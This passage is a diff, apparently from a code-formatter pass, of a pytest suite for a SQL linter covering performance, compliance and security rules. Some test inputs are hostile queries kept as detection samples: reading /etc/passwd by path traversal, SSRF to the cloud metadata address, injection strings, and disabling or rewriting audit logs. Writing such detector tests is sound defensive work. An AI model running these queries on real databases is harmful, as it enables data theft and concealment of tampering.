         assert self.rule.check(_make_query("SET audit_trail = NONE"))
 
     def test_update_audit(self):
-        assert self.rule.check(_make_query("UPDATE audit SET action = 'read' WHERE action = 'delete'"))
+        assert self.rule.check(
+            _make_query("UPDATE audit SET action = 'read' WHERE action = 'delete'")
+        )
 
     def test_insert_audit(self):
         assert not self.rule.check(_make_query("INSERT INTO audit_log (action) VALUES ('login')"))
@@ -1831,16 +1889,26 @@ class TestInsecureSessionTokenStorageRule:
         self.rule = InsecureSessionTokenStorageRule()
 
     def test_insert_session_token(self):
-        assert self.rule.check(_make_query("INSERT INTO sessions (user_id, session_token) VALUES (1, 'abc123xyz789_abcdefghij...')"))
+        assert self.rule.check(
+            _make_query(
+                "INSERT INTO sessions (user_id, session_token) VALUES (1, 'abc123xyz789_abcdefghij...')"
+            )
+        )
 
     def test_update_auth_token(self):
-        assert self.rule.check(_make_query("UPDATE sessions SET auth_token = 'eyJhbGciOiJIUzI1NiIs...'"))
+        assert self.rule.check(
+            _make_query("UPDATE sessions SET auth_token = 'eyJhbGciOiJIUzI1NiIs...'")
+        )
 
     def test_insert_token_hash(self):
-        assert not self.rule.check(_make_query("INSERT INTO sessions (token_hash) VALUES (SHA256(?))"))
+        assert not self.rule.check(
+            _make_query("INSERT INTO sessions (token_hash) VALUES (SHA256(?))")
+        )
 
     def test_select_token(self):
-        assert not self.rule.check(_make_query("SELECT session_token FROM sessions WHERE user_id = ?"))
+        assert not self.rule.check(
+            _make_query("SELECT session_token FROM sessions WHERE user_id = ?")
+        )
 
 
 class TestSessionTimeoutNotEnforcedRule:
@@ -1854,10 +1922,16 @@ class TestSessionTimeoutNotEnforcedRule:
         assert self.rule.check(_make_query("SELECT * FROM auth_tokens WHERE session_id = ?"))
 
     def test_select_token_with_expires_at(self):
-        assert not self.rule.check(_make_query("SELECT user_id FROM sessions WHERE token = ? AND expires_at > NOW()"))
+        assert not self.rule.check(
+            _make_query("SELECT user_id FROM sessions WHERE token = ? AND expires_at > NOW()")
+        )
 
     def test_select_token_with_valid_until(self):
-        assert not self.rule.check(_make_query("SELECT * FROM sessions WHERE token = ? AND valid_until > CURRENT_TIMESTAMP"))
+        assert not self.rule.check(
+            _make_query(
+                "SELECT * FROM sessions WHERE token = ? AND valid_until > CURRENT_TIMESTAMP"
+            )
+        )
 
 
 class TestUnboundedRecursiveCTERule:
@@ -1865,13 +1939,23 @@ class TestUnboundedRecursiveCTERule:
         self.rule = UnboundedRecursiveCTERule()
 
     def test_recursive_cte_unbounded(self):
-        assert self.rule.check(_make_query("WITH RECURSIVE cte AS (SELECT 1 UNION ALL SELECT n+1 FROM cte) SELECT * FROM cte"))
+        assert self.rule.check(
+            _make_query(
+                "WITH RECURSIVE cte AS (SELECT 1 UNION ALL SELECT n+1 FROM cte) SELECT * FROM cte"
+            )
+        )
 
     def test_recursive_cte_with_maxrecursion(self):
-        assert not self.rule.check(_make_query("WITH RECURSIVE cte AS (SELECT 1 UNION ALL SELECT n+1 FROM cte) SELECT * FROM cte OPTION (MAXRECURSION 100)"))
+        assert not self.rule.check(
+            _make_query(
+                "WITH RECURSIVE cte AS (SELECT 1 UNION ALL SELECT n+1 FROM cte) SELECT * FROM cte OPTION (MAXRECURSION 100)"
+            )
+        )
 
     def test_non_recursive_cte(self):
-        assert not self.rule.check(_make_query("WITH cte AS (SELECT 1 UNION ALL SELECT 2) SELECT * FROM cte"))
+        assert not self.rule.check(
+            _make_query("WITH cte AS (SELECT 1 UNION ALL SELECT 2) SELECT * FROM cte")
+        )
 
 
 class TestRegexDenialOfServiceRule:
@@ -1885,7 +1969,9 @@ class TestRegexDenialOfServiceRule:
         assert self.rule.check(_make_query("SELECT * FROM logs WHERE msg RLIKE '(.*)*'"))
 
     def test_safe_regex(self):
-        assert not self.rule.check(_make_query("SELECT * FROM users WHERE email REGEXP '^[a-z]+@[a-z]+\\.[a-z]+$'"))
+        assert not self.rule.check(
+            _make_query("SELECT * FROM users WHERE email REGEXP '^[a-z]+@[a-z]+\\.[a-z]+$'")
+        )
 
     def test_like_query(self):
         assert not self.rule.check(_make_query("SELECT * FROM users WHERE name LIKE '%john%'"))
@@ -1910,7 +1996,9 @@ class TestCompositeIndexOrderViolationRule:
         assert self.rule.check(_make_query("SELECT * FROM users WHERE user_id = 123"))
 
     def test_no_violation(self):
-        assert not self.rule.check(_make_query("SELECT * FROM users WHERE tenant_id = 1 AND user_id = 123"))
+        assert not self.rule.check(
+            _make_query("SELECT * FROM users WHERE tenant_id = 1 AND user_id = 123")
+        )
 
 
 class TestNonSargableOrConditionRule:
@@ -1918,10 +2006,14 @@ class TestNonSargableOrConditionRule:
         self.rule = NonSargableOrConditionRule()
 
     def test_non_sargable_or(self):
-        assert self.rule.check(_make_query("SELECT * FROM users WHERE first_name = 'John' OR last_name = 'Smith'"))
+        assert self.rule.check(
+            _make_query("SELECT * FROM users WHERE first_name = 'John' OR last_name = 'Smith'")
+        )
 
     def test_sargable_and(self):
-        assert not self.rule.check(_make_query("SELECT * FROM users WHERE first_name = 'John' AND last_name = 'Smith'"))
+        assert not self.rule.check(
+            _make_query("SELECT * FROM users WHERE first_name = 'John' AND last_name = 'Smith'")
+        )
 
 
 class TestCoalesceOnIndexedColumnRule:
@@ -1929,7 +2021,9 @@ class TestCoalesceOnIndexedColumnRule:
         self.rule = CoalesceOnIndexedColumnRule()
 
     def test_coalesce_on_column(self):
-        assert self.rule.check(_make_query("SELECT * FROM users WHERE COALESCE(status, 'active') = 'active'"))
+        assert self.rule.check(
+            _make_query("SELECT * FROM users WHERE COALESCE(status, 'active') = 'active'")
+        )
 
     def test_no_coalesce(self):
         assert not self.rule.check(_make_query("SELECT * FROM users WHERE status = 'active'"))
@@ -1943,7 +2037,9 @@ class TestNegationOnIndexedColumnRule:
         assert self.rule.check(_make_query("SELECT * FROM users WHERE status != 'active'"))
 
     def test_negation_not_in(self):
-        assert self.rule.check(_make_query("SELECT * FROM users WHERE status NOT IN ('active', 'pending')"))
+        assert self.rule.check(
+            _make_query("SELECT * FROM users WHERE status NOT IN ('active', 'pending')")
+        )
 
     def test_no_negation(self):
         assert not self.rule.check(_make_query("SELECT * FROM users WHERE status = 'active'"))
@@ -1983,7 +2079,9 @@ class TestLongTransactionPatternRule:
         assert self.rule.check(_make_query(long_query))
 
     def test_short_transaction(self):
-        assert not self.rule.check(_make_query("BEGIN TRANSACTION; UPDATE users SET status = 'active'; COMMIT;"))
+        assert not self.rule.check(
+            _make_query("BEGIN TRANSACTION; UPDATE users SET status = 'active'; COMMIT;")
+        )
 
 
 class TestMissingTransactionIsolationRule:
@@ -1991,10 +2089,16 @@ class TestMissingTransactionIsolationRule:
         self.rule = MissingTransactionIsolationRule()
 
     def test_missing_isolation(self):
-        assert self.rule.check(_make_query("BEGIN TRANSACTION; UPDATE users SET status = 'active'; COMMIT;"))
+        assert self.rule.check(
+            _make_query("BEGIN TRANSACTION; UPDATE users SET status = 'active'; COMMIT;")
+        )
 
     def test_with_isolation(self):
-        assert not self.rule.check(_make_query("SET TRANSACTION ISOLATION LEVEL READ COMMITTED; BEGIN TRANSACTION; UPDATE users SET status = 'active'; COMMIT;"))
+        assert not self.rule.check(
+            _make_query(
+                "SET TRANSACTION ISOLATION LEVEL READ COMMITTED; BEGIN TRANSACTION; UPDATE users SET status = 'active'; COMMIT;"
+            )
+        )
 
 
 class TestCursorDeclarationRule:
@@ -2050,7 +2154,9 @@ class TestUnboundedTempTableRule:
         assert self.rule.check(_make_query("SELECT * INTO #temp_users FROM users"))
 
     def test_bounded_temp_table(self):
-        assert not self.rule.check(_make_query("SELECT * INTO #temp_users FROM users WHERE id > 100"))
+        assert not self.rule.check(
+            _make_query("SELECT * INTO #temp_users FROM users WHERE id > 100")
+        )
 
     def test_top_into_temp_table(self):
         assert not self.rule.check(_make_query("SELECT TOP 10 * INTO #temp_users FROM users"))
@@ -2064,10 +2170,14 @@ class TestOrderByWithoutLimitInSubqueryRule:
         self.rule = OrderByWithoutLimitInSubqueryRule()
 
     def test_order_by_in_subquery(self):
-        assert self.rule.check(_make_query("SELECT * FROM (SELECT * FROM users ORDER BY created_at) AS u"))
+        assert self.rule.check(
+            _make_query("SELECT * FROM (SELECT * FROM users ORDER BY created_at) AS u")
+        )
 
     def test_order_by_with_limit(self):
-        assert not self.rule.check(_make_query("SELECT * FROM (SELECT * FROM users ORDER BY created_at LIMIT 10) AS u"))
+        assert not self.rule.check(
+            _make_query("SELECT * FROM (SELECT * FROM users ORDER BY created_at LIMIT 10) AS u")
+        )
 
 
 class TestGroupByHighCardinalityRule:
@@ -2075,10 +2185,16 @@ class TestGroupByHighCardinalityRule:
         self.rule = GroupByHighCardinalityRule()
 
     def test_high_cardinality_group_by(self):
-        assert self.rule.check(_make_query("SELECT user_id, count(*) FROM logs GROUP BY user_id, email, phone, address"))
+        assert self.rule.check(
+            _make_query(
+                "SELECT user_id, count(*) FROM logs GROUP BY user_id, email, phone, address"
+            )
+        )
 
     def test_low_cardinality(self):
-        assert not self.rule.check(_make_query("SELECT status, count(*) FROM users GROUP BY status"))
+        assert not self.rule.check(
+            _make_query("SELECT status, count(*) FROM users GROUP BY status")
+        )
 
 
 class TestQueryOptimizerHintRule:
@@ -2122,7 +2238,9 @@ class TestScalarUdfInQueryRule:
         assert self.rule.check(_make_query("SELECT dbo.GetStatus(id) FROM users"))
 
     def test_scalar_udf_in_where(self):
-        assert self.rule.check(_make_query("SELECT * FROM users WHERE dbo.GetStatus(id) = 'active'"))
+        assert self.rule.check(
+            _make_query("SELECT * FROM users WHERE dbo.GetStatus(id) = 'active'")
+        )
 
     def test_built_in_function(self):
         assert not self.rule.check(_make_query("SELECT COUNT(*) FROM users"))
@@ -2133,10 +2251,18 @@ class TestCorrelatedSubqueryRule:
         self.rule = CorrelatedSubqueryRule()
 
     def test_correlated_subquery(self):
-        assert self.rule.check(_make_query("SELECT * FROM employees e WHERE salary > (SELECT AVG(salary) FROM employees WHERE department_id = e.department_id)"))
+        assert self.rule.check(
+            _make_query(
+                "SELECT * FROM employees e WHERE salary > (SELECT AVG(salary) FROM employees WHERE department_id = e.department_id)"
+            )
+        )
 
     def test_uncorrelated_subquery(self):
-        assert not self.rule.check(_make_query("SELECT * FROM employees WHERE department_id IN (SELECT id FROM departments WHERE active = true)"))
+        assert not self.rule.check(
+            _make_query(
+                "SELECT * FROM employees WHERE department_id IN (SELECT id FROM departments WHERE active = true)"
+            )
+        )
 
 
 class TestOrderByNonIndexedColumnRule:
@@ -2155,13 +2281,19 @@ class TestLargeUnbatchedOperationRule:
         self.rule = LargeUnbatchedOperationRule()
 
     def test_large_update(self):
-        assert self.rule.check(_make_query("UPDATE users SET status = 'inactive' WHERE last_login < '2020-01-01'"))
+        assert self.rule.check(
+            _make_query("UPDATE users SET status = 'inactive' WHERE last_login < '2020-01-01'")
+        )
 
     def test_large_delete(self):
         assert self.rule.check(_make_query("DELETE FROM logs WHERE level = 'debug'"))
 
     def test_batched_operation(self):
-        assert not self.rule.check(_make_query("UPDATE top (100) users SET status = 'inactive' WHERE last_login < '2020-01-01'"))
+        assert not self.rule.check(
+            _make_query(
+                "UPDATE top (100) users SET status = 'inactive' WHERE last_login < '2020-01-01'"
+            )
+        )
 
 
 class TestMissingBatchSizeInLoopRule:
@@ -2195,7 +2327,9 @@ class TestLargeObjectUnboundedRule:
         assert self.rule.check(_make_query("SELECT id, document_blob FROM documents"))
 
     def test_bounded_blob(self):
-        assert not self.rule.check(_make_query("SELECT id, document_blob FROM documents WHERE id = 123"))
+        assert not self.rule.check(
+            _make_query("SELECT id, document_blob FROM documents WHERE id = 123")
+        )
 
     def test_blob_with_limit(self):
         assert not self.rule.check(_make_query("SELECT id, document_blob FROM documents LIMIT 10"))
@@ -2234,7 +2368,9 @@ class TestUnencryptedPHITransitRule:
         assert self.rule.check(_make_query("SET connection_string = 'encrypt=false;database=phi';"))
 
     def test_secure_phi_transit(self):
-        assert not self.rule.check(_make_query("SET connection_string = 'encrypt=true;database=phi';"))
+        assert not self.rule.check(
+            _make_query("SET connection_string = 'encrypt=true;database=phi';")
+        )
 
 
 class TestPANExposureRule:
@@ -2270,7 +2406,9 @@ class TestCardholderDataRetentionRule:
         assert self.rule.check(_make_query("SELECT * FROM transactions"))
 
     def test_with_retention_filter(self):
-        assert not self.rule.check(_make_query("SELECT * FROM transactions WHERE created_at > '2023-01-01'"))
+        assert not self.rule.check(
+            _make_query("SELECT * FROM transactions WHERE created_at > '2023-01-01'")
+        )
 
 
 class TestFinancialChangeTrackingRule:
@@ -2281,7 +2419,9 @@ class TestFinancialChangeTrackingRule:
         assert self.rule.check(_make_query("UPDATE salaries SET amount = 10000"))
 
     def test_financial_update_with_track(self):
-        assert not self.rule.check(_make_query("UPDATE salaries SET amount = 10000 -- ticket: HR-99"))
+        assert not self.rule.check(
+            _make_query("UPDATE salaries SET amount = 10000 -- ticket: HR-99")
+        )
 
 
 class TestSegregationOfDutiesRule:
@@ -2289,7 +2429,9 @@ class TestSegregationOfDutiesRule:
         self.rule = SegregationOfDutiesRule()
 
     def test_sod_violation(self):
-        assert self.rule.check(_make_query("UPDATE ledger SET status = 'approved' WHERE created_by = 'admin'"))
+        assert self.rule.check(
+            _make_query("UPDATE ledger SET status = 'approved' WHERE created_by = 'admin'")
+        )
 
     def test_safe_update(self):
         assert not self.rule.check(_make_query("UPDATE ledger SET status = 'pending'"))
@@ -2303,7 +2445,11 @@ class TestDataExportCompletenessRule:
         assert self.rule.check(_make_query("SELECT * FROM users -- dsar export"))
 
     def test_complete_export(self):
-        assert not self.rule.check(_make_query("SELECT * FROM users JOIN activity_logs ON users.id = activity_logs.user_id -- dsar export"))
+        assert not self.rule.check(
+            _make_query(
+                "SELECT * FROM users JOIN activity_logs ON users.id = activity_logs.user_id -- dsar export"
+            )
+        )
 
 
 class TestConsentWithdrawalRule:
@@ -2325,7 +2471,9 @@ class TestCCPAOptOutRule:
         assert self.rule.check(_make_query("SELECT email FROM marketing_list"))
 
     def test_with_opt_out_check(self):
-        assert not self.rule.check(_make_query("SELECT email FROM marketing_list WHERE do_not_sell = 0"))
+        assert not self.rule.check(
+            _make_query("SELECT email FROM marketing_list WHERE do_not_sell = 0")
+        )
 
 
 class TestNonIdempotentInsertRule:
@@ -2336,7 +2484,9 @@ class TestNonIdempotentInsertRule:
         assert self.rule.check(_make_query("INSERT INTO users (name) VALUES ('John')"))
 
     def test_insert_with_on_conflict(self):
-        assert not self.rule.check(_make_query("INSERT INTO users (name) VALUES ('John') ON CONFLICT DO NOTHING"))
+        assert not self.rule.check(
+            _make_query("INSERT INTO users (name) VALUES ('John') ON CONFLICT DO NOTHING")
+        )
 
 
 class TestNonIdempotentUpdateRule:
@@ -2344,10 +2494,16 @@ class TestNonIdempotentUpdateRule:
         self.rule = NonIdempotentUpdateRule()
 
     def test_relative_update_without_version(self):
-        assert self.rule.check(_make_query("UPDATE accounts SET balance = balance + 100 WHERE id = 1"))
+        assert self.rule.check(
+            _make_query("UPDATE accounts SET balance = balance + 100 WHERE id = 1")
+        )
 
     def test_relative_update_with_version(self):
-        assert not self.rule.check(_make_query("UPDATE accounts SET balance = balance + 100, version = version + 1 WHERE id = 1 AND version = 5"))
+        assert not self.rule.check(
+            _make_query(
+                "UPDATE accounts SET balance = balance + 100, version = version + 1 WHERE id = 1 AND version = 5"
+            )
+        )
 
 
 class TestReadModifyWriteLockingRule:
@@ -2355,10 +2511,18 @@ class TestReadModifyWriteLockingRule:
         self.rule = ReadModifyWriteLockingRule()
 
     def test_rmw_risk(self):
-        assert self.rule.check(_make_query("SELECT balance FROM accounts WHERE id = 1; UPDATE accounts SET balance = 500 WHERE id = 1;"))
+        assert self.rule.check(
+            _make_query(
+                "SELECT balance FROM accounts WHERE id = 1; UPDATE accounts SET balance = 500 WHERE id = 1;"
+            )
+        )
 
     def test_rmw_with_lock(self):
-        assert not self.rule.check(_make_query("SELECT balance FROM accounts WHERE id = 1 FOR UPDATE; UPDATE accounts SET balance = 500 WHERE id = 1;"))
+        assert not self.rule.check(
+            _make_query(
+                "SELECT balance FROM accounts WHERE id = 1 FOR UPDATE; UPDATE accounts SET balance = 500 WHERE id = 1;"
+            )
+        )
 
 
 class TestTOCTOUPatternRule:
@@ -2366,7 +2530,11 @@ class TestTOCTOUPatternRule:
         self.rule = TOCTOUPatternRule()
 
     def test_toctou_risk(self):
-        assert self.rule.check(_make_query("IF NOT EXISTS (SELECT 1 FROM users WHERE id = 1) INSERT INTO users (id) VALUES (1)"))
+        assert self.rule.check(
+            _make_query(
+                "IF NOT EXISTS (SELECT 1 FROM users WHERE id = 1) INSERT INTO users (id) VALUES (1)"
+            )
+        )
 
     def test_no_toctou(self):
         assert not self.rule.check(_make_query("INSERT INTO users (id) VALUES (1)"))
@@ -2380,7 +2548,11 @@ class TestOrphanRecordRiskRule:
         assert self.rule.check(_make_query("INSERT INTO orders (user_id, total) VALUES (1, 100)"))
 
     def test_with_exists_check(self):
-        assert not self.rule.check(_make_query("INSERT INTO orders (user_id) SELECT 1 WHERE EXISTS (SELECT 1 FROM users WHERE id = 1)"))
+        assert not self.rule.check(
+            _make_query(
+                "INSERT INTO orders (user_id) SELECT 1 WHERE EXISTS (SELECT 1 FROM users WHERE id = 1)"
+            )
+        )
 
 
 class TestCascadeDeleteRiskRule:
@@ -2414,10 +2586,14 @@ class TestLockEscalationRiskRule:
         assert self.rule.check(_make_query("UPDATE large_table SET status = 'processed'"))
 
     def test_lock_escalation_non_selective(self):
-        assert self.rule.check(_make_query("UPDATE large_table SET status = 'processed' WHERE type = 'old'"))
+        assert self.rule.check(
+            _make_query("UPDATE large_table SET status = 'processed' WHERE type = 'old'")
+        )
 
     def test_selective_update(self):
-        assert not self.rule.check(_make_query("UPDATE large_table SET status = 'processed' WHERE id = 1"))
+        assert not self.rule.check(
+            _make_query("UPDATE large_table SET status = 'processed' WHERE id = 1")
+        )
 
 
 class TestLongRunningQueryRiskRule:
@@ -2438,10 +2614,18 @@ class TestStaleReadRiskRule:
         self.rule = StaleReadRiskRule()
 
     def test_stale_read_risk(self):
-        assert self.rule.check(_make_query("UPDATE users SET name = 'John' WHERE id = 1; SELECT * FROM users WHERE id = 1;"))
+        assert self.rule.check(
+            _make_query(
+                "UPDATE users SET name = 'John' WHERE id = 1; SELECT * FROM users WHERE id = 1;"
+            )
+        )
 
     def test_within_transaction(self):
-        assert not self.rule.check(_make_query("BEGIN; UPDATE users SET name = 'John' WHERE id = 1; SELECT * FROM users WHERE id = 1; COMMIT;"))
+        assert not self.rule.check(
+            _make_query(
+                "BEGIN; UPDATE users SET name = 'John' WHERE id = 1; SELECT * FROM users WHERE id = 1; COMMIT;"
+            )
+        )
 
 
 class TestMissingRetryLogicRule:
@@ -2449,7 +2633,9 @@ class TestMissingRetryLogicRule:
         self.rule = MissingRetryLogicRule()
 
     def test_missing_retry(self):
-        assert self.rule.check(_make_query("BEGIN TRANSACTION; UPDATE accounts SET balance = 100; COMMIT;"))
+        assert self.rule.check(
+            _make_query("BEGIN TRANSACTION; UPDATE accounts SET balance = 100; COMMIT;")
+        )
 
     def test_with_retry_pattern(self):
         sql = """
@@ -2553,10 +2739,14 @@ class TestCrossDatabaseJoinRule:
         self.rule = CrossDatabaseJoinRule()
 
     def test_cross_db_join_triggers(self):
-        assert self.rule.check(_make_query("SELECT * FROM db1.table1 JOIN db2.table2 ON db1.table1.id = db2.table2.id"))
+        assert self.rule.check(
+            _make_query("SELECT * FROM db1.table1 JOIN db2.table2 ON db1.table1.id = db2.table2.id")
+        )
 
     def test_single_db_join_no_trigger(self):
-        assert not self.rule.check(_make_query("SELECT * FROM db1.table1 JOIN db1.table2 ON table1.id = table2.id"))
+        assert not self.rule.check(
+            _make_query("SELECT * FROM db1.table1 JOIN db1.table2 ON table1.id = table2.id")
+        )
 
 
 class TestMultiRegionQueryLatencyRule:
@@ -2586,7 +2776,9 @@ class TestColdStartQueryPatternRule:
         self.rule = ColdStartQueryPatternRule()
 
     def test_complex_scaling_pattern_triggers(self):
-        assert self.rule.check(_make_query("SELECT * FROM t1 JOIN t2 ON t1.id = t2.id GROUP BY t1.name"))
+        assert self.rule.check(
+            _make_query("SELECT * FROM t1 JOIN t2 ON t1.id = t2.id GROUP BY t1.name")
+        )
 
     def test_simple_query_no_trigger(self):
         assert not self.rule.check(_make_query("SELECT * FROM t1 WHERE id = 1"))
@@ -2637,12 +2829,15 @@ class TestLargeTableWithoutPartitioningRule:
     def test_partitioned_query_no_trigger(self):
         assert not self.rule.check(_make_query("SELECT * FROM events PARTITION(p2023)"))
 
+
 class TestLDAPInjectionRule:
     def setup_method(self):
         self.rule = LDAPInjectionRule()
 
     def test_ldap_concat_triggers(self):
-        assert self.rule.check(_make_query("SELECT * FROM ldap_query('cn=' + @username + ',dc=example,dc=com')"))
+        assert self.rule.check(
+            _make_query("SELECT * FROM ldap_query('cn=' + @username + ',dc=example,dc=com')")
+        )
 
     def test_parameterized_no_trigger(self):
         assert not self.rule.check(_make_query("SELECT * FROM ldap_query('cn=?', @username)"))
@@ -2653,7 +2848,9 @@ class TestNoSQLInjectionRule:
         self.rule = NoSQLInjectionRule()
 
     def test_nosql_concat_triggers(self):
-        assert self.rule.check(_make_query("SELECT * FROM mongo_find('{\"user\": \"' + @user + '\"}')"))
+        assert self.rule.check(
+            _make_query("SELECT * FROM mongo_find('{\"user\": \"' + @user + '\"}')")
+        )
 
     def test_safe_json_no_trigger(self):
         assert not self.rule.check(_make_query("SELECT * FROM mongo_find('{\"user\": ?}', @user)"))
@@ -2664,10 +2861,16 @@ class TestXMLXPathInjectionRule:
         self.rule = XMLXPathInjectionRule()
 
     def test_xpath_concat_triggers(self):
-        assert self.rule.check(_make_query("SELECT * FROM docs WHERE xpath('/user[@name=\"' + @name + '\"]/role', xml_data)"))
+        assert self.rule.check(
+            _make_query(
+                "SELECT * FROM docs WHERE xpath('/user[@name=\"' + @name + '\"]/role', xml_data)"
+            )
+        )
 
     def test_safe_xpath_no_trigger(self):
-        assert not self.rule.check(_make_query("SELECT * FROM docs WHERE xpath('/user[@name=\"admin\"]/role', xml_data)"))
+        assert not self.rule.check(
+            _make_query("SELECT * FROM docs WHERE xpath('/user[@name=\"admin\"]/role', xml_data)")
+        )
 
 
 class TestServerSideTemplateInjectionRule:
@@ -2686,7 +2889,9 @@ class TestJSONFunctionInjectionRule:
         self.rule = JSONFunctionInjectionRule()
 
     def test_json_concat_triggers(self):
-        assert self.rule.check(_make_query("SELECT JSON_QUERY('{\"key\": \"' + @input + '\"}', '$.key')"))
+        assert self.rule.check(
+            _make_query("SELECT JSON_QUERY('{\"key\": \"' + @input + '\"}', '$.key')")
+        )
 
     def test_safe_json_obj_no_trigger(self):
         assert not self.rule.check(_make_query("SELECT JSON_OBJECT('key', @input)"))
@@ -2752,7 +2957,9 @@ class TestPathTraversalRule:
         self.rule = PathTraversalRule()
 
     def test_traversal_triggers(self):
-        assert self.rule.check(_make_query("LOAD_FILE('/var/lib/mysql/' + @filename + '/../../etc/passwd')"))
+        assert self.rule.check(
+            _make_query("LOAD_FILE('/var/lib/mysql/' + @filename + '/../../etc/passwd')")
+        )
 
     def test_safe_load_no_trigger(self):
         assert not self.rule.check(_make_query("LOAD_FILE('/var/lib/mysql/data.csv')"))
@@ -2774,10 +2981,18 @@ class TestSSRFViaDatabaseRule:
         self.rule = SSRFViaDatabaseRule()
 
     def test_ssrf_triggers(self):
-        assert self.rule.check(_make_query("SELECT * FROM OPENROWSET('SQLNCLI', 'Server=http://169.254.169.254/latest/meta-data/;Trusted_Connection=yes', 'SELECT 1')"))
+        assert self.rule.check(
+            _make_query(
+                "SELECT * FROM OPENROWSET('SQLNCLI', 'Server=http://169.254.169.254/latest/meta-data/;Trusted_Connection=yes', 'SELECT 1')"
+            )
+        )
 
     def test_safe_openrowset_no_trigger(self):
-        assert not self.rule.check(_make_query("SELECT * FROM OPENROWSET('SQLNCLI', 'Server=MyServer;Trusted_Connection=yes', 'SELECT 1')"))
+        assert not self.rule.check(
+            _make_query(
+                "SELECT * FROM OPENROWSET('SQLNCLI', 'Server=MyServer;Trusted_Connection=yes', 'SELECT 1')"
+            )
+        )
 
 
 class TestHardcodedCredentialsRule:
@@ -2823,9 +3038,11 @@ class TestOverlyPermissiveAccessRule:
     def test_restricted_access_no_trigger(self):
         assert not self.rule.check(_make_query("GRANT ALL ON *.* TO 'webuser'@'10.0.1.5'"))
 
+
 # =============================================================================
 # BATCH 5: QUALITY & MAINTAINABILITY
 # =============================================================================
+
 
 class TestExcessiveCaseNestingRule:
     rule = ExcessiveCaseNestingRule()
@@ -2845,7 +3062,9 @@ class TestExcessiveSubqueryNestingRule:
 
     def test_deep_subqueries(self):
         # 4 levels deep
-        sql = "SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM users) as s1) as s2) as s3"
+        sql = (
+            "SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM users) as s1) as s2) as s3"
+        )
         assert self.rule.check(_make_query(sql))
 
     def test_shallow_subqueries(self):
@@ -3035,7 +3254,9 @@ class TestNonDeterministicQueryRule:
         assert self.rule.check(_make_query("SELECT * FROM logs WHERE created_at < NOW()"))
 
     def test_static_date(self):
-        assert not self.rule.check(_make_query("SELECT * FROM logs WHERE created_at < '2023-01-01'"))
+        assert not self.rule.check(
+            _make_query("SELECT * FROM logs WHERE created_at < '2023-01-01'")
+        )
 
 
 class TestOrderByMissingForPaginationRule:
@@ -3052,10 +3273,14 @@ class TestHardcodedTestDataRule:
     rule = HardcodedTestDataRule()
 
     def test_test_data(self):
-        assert self.rule.check(_make_query("SELECT * FROM users WHERE email = 'testuser@example.com'"))
+        assert self.rule.check(
+            _make_query("SELECT * FROM users WHERE email = 'testuser@example.com'")
+        )
 
     def test_real_data(self):
-        assert not self.rule.check(_make_query("SELECT * FROM users WHERE email = 'user@gmail.com'"))
+        assert not self.rule.check(
+            _make_query("SELECT * FROM users WHERE email = 'user@gmail.com'")
+        )
 
 
 class TestTodoFixmeCommentRule:
